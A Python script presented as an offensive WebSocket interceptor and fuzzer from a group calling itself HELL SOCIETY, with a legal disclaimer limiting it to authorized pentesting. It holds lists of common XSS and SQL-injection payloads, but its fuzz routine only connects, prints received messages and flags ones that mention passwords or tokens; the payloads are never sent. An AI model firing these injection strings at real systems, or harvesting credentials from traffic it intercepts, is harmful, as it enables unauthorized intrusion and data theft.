#!/usr/bin/env python3
"""
╔══════════════════════════════════════════════════════════════════╗
║  WEBSOCKET INTERCEPTOR & FUZZER v2.0                             ║
║  Created by: HELL SOCIETY Community                              ║
║  Category: Offensive - Application Pentesting                    ║
╚══════════════════════════════════════════════════════════════════╝

ADVERTENCIA LEGAL: El uso de esta herramienta sin autorización
escrita del propietario del sistema objetivo es ILEGAL.
Los creadores NO se hacen responsables del mal uso de esta herramienta.
"""

import sys
import colorama
from colorama import Fore, Back, Style
import argparse
import json
import websocket
import threading
import time

colorama.init(autoreset=True)

BANNER = f"""
{Fore.CYAN}╔══════════════════════════════════════════════════════════════════╗
║{Fore.RED}  ██╗    ██╗███████╗██╗      ██████╗ ██╗████████╗██╗  ██╗███████╗██╗    {Fore.CYAN}║
║{Fore.RED}  ██║    ██║██╔════╝██║     ██╔═══██╗██║╚══██╔══╝██║  ██║██╔════╝██║    {Fore.CYAN}║
║{Fore.RED}  ██║ █╗ ██║█████╗  ██║     ██║   ██║██║   ██║   ███████║█████╗  ██║    {Fore.CYAN}║
║{Fore.RED}  ██║███╗██║██╔══╝  ██║     ██║   ██║██║   ██║   ██╔══██║██╔══╝  ██║    {Fore.CYAN}║
║{Fore.RED}  ╚███╔███╔╝███████╗███████╗╚██████╔╝██║   ██║   ██║  ██║███████╗███████╗{Fore.CYAN}║
║{Fore.RED}   ╚══╝╚══╝ ╚══════╝╚══════╝ ╚═════╝ ╚═╝   ╚═╝   ╚═╝  ╚═╝╚══════╝╚══════╝{Fore.CYAN}║
╠══════════════════════════════════════════════════════════════════╣
║{Fore.YELLOW}  HELL SOCIETY - WebSocket Interceptor v2.0                           {Fore.CYAN}║
╚══════════════════════════════════════════════════════════════════╝
"""

DISCLAIMER = f"""
{Fore.RED}{Back.BLACK}
[!] ADVERTENCIA LEGAL [!]
Esta herramienta es para uso en pentesting AUTORIZADO únicamente.
Los creadores (HELL SOCIETY) NO se hacen responsables del mal uso.
"""

XSS_PAYLOADS = [
    '<script>alert(1)</script>',
    '<img src=x onerror=alert(1)>',
    '<svg onload=alert(1)>',
    "javascript:alert(1)",
    '<body onload=alert(1)>',
    '" autofocus onfocus=alert(1)//',
    "'-alert(1)//",
    '"></script><script>alert(1)</script>',
]

SQL_PAYLOADS = [
    "' OR '1'='1",
    '" OR "1"="1',
    "' OR 1=1 --",
    "1' AND 1=1 --",
    "' UNION SELECT NULL --",
    "' UNION SELECT 1,2,3 --",
    "' AND EXTRACTVALUE(1,CONCAT(0x7e,(SELECT version()))) --",
]

class WebSocketInterceptor:
    def __init__(self, url, origin=None):
        self.url = url
        self.origin = origin
        self.intercepted = []
        self.modified = False
        self.message_count = 0

    def on_message(self, ws, message):
        self.message_count += 1
        print(f"{Fore.GREEN}  [RECV] {Fore.WHITE}{message[:200]}")

        # Check for sensitive data
        if any(kw in message.lower() for kw in ['password', 'token', 'secret', 'key', 'auth']):
            print(f"  {Fore.RED}  [SENSITIVE] Contains sensitive data!")

        self.intercepted.append(message)

    def on_error(self, ws, error):
        print(f"{Fore.RED}  [ERROR] {error}")

    def on_close(self, ws, close_status, close_msg):
        print(f"{Fore.YELLOW}  [CLOSED] Connection closed")
        self.print_summary()

    def on_open(self, ws):
        print(f"{Fore.GREEN}  [OPEN] WebSocket connection established\n")
        print(f"{Fore.CYAN}  [*] Listening for messages...")
        print(f"{Fore.CYAN}  [*] Press Ctrl+C to stop\n")

    def fuzz(self):
        print(f"{Fore.CYAN}  [*] Target: {Fore.WHITE}{self.url}")
        print(f"{Fore.CYAN}  [*] Starting WebSocket interception...\n")

        try:
            ws = websocket.WebSocketApp(
                self.url,
                on_open=self.on_open,
                on_message=self.on_message,
                on_error=self.on_error,
                on_close=self.on_close,
            )
            if self.origin:
                ws.run_forever(origin=self.origin)
            else:
                ws.run_forever()
        except KeyboardInterrupt:
            print(f"\n{Fore.YELLOW}  [!] Stopped by user")
            self.print_summary()
        except Exception as e:
            print(f"{Fore.RED}  [!] Error: {e}")

    def print_summary(self):
        print(f"\n{Fore.CYAN}  {'═' * 60}")
        print(f"{Fore.CYAN}  SUMMARY:")
        print(f"{Fore.CYAN}  {'═' * 60}")
        print(f"  {Fore.CYAN}Total messages intercepted: {self.message_count}")

        sensitive = [m for m in self.intercepted if any(
            kw in m.lower() for kw in ['password', 'token', 'secret', 'key', 'auth'])]
        if sensitive:
            print(f"  {Fore.RED}Sensitive data found: {len(sensitive)}")

def main():
    print(BANNER)
    print(DISCLAIMER)

    parser = argparse.ArgumentParser(description='Hell Society WebSocket Interceptor')
    parser.add_argument('-u', '--url', required=True, help='WebSocket URL (ws:// or wss://)')
    parser.add_argument('-o', '--origin', help='Origin header')
    args = parser.parse_args()

    interceptor = WebSocketInterceptor(args.url, args.origin)
    interceptor.fuzz()

if __name__ == "__main__":
    main()
